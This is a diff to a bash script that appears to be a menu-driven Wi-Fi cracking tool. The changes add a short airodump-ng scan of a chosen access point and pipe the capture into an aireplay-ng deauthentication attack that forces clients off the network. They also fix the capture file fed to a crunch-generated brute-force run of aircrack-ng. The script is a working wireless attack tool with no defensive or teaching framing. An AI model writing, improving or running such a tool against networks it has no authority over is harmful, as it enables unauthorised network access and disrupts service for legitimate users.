@@ -144,7 +144,7 @@ fi
 
 
 
-if [ $choix = "rtvh" ]
+if [ $choix = "crack" ]
 then
 clear
 echo
@@ -193,7 +193,16 @@ echo -e ' \e[1;37m '
 echo
 echo
 echo
-xterm -title crack -e airodump-ng -c $apch --bssid $apbssid -w $filecap1 $winterface
+echo
+n_secondes=7
+( xterm -title wait... -e "airodump-ng -c $apch --bssid $apbssid $winterface >> lewifi1.txt") &
+sleep 7
+kill $!
+echo [ok]
+rm -r -f lewifi1.txt
+echo
+echo
+xterm -title crack -e airodump-ng -c $apch --bssid $apbssid -w $filecap1 $winterface | aireplay-ng -0 9 -a $apbssid $winterface
 echo
 echo
 echo
@@ -210,7 +219,7 @@ echo wep   or wpa
 echo
 echo
 read -p 'sercurity : ' ecript
-crunch 8 25 azertyuioqsdfghjklmwxcvbn01234567890 | aircrack-ng -w - -b $apbssid -a $ecript $filecap1.cap
+crunch 8 25 azertyuioqsdfghjklmwxcvbn01234567890 | aircrack-ng -w - -b $apbssid -a $ecript $filecap1-01.cap
 echo
 echo
 clear
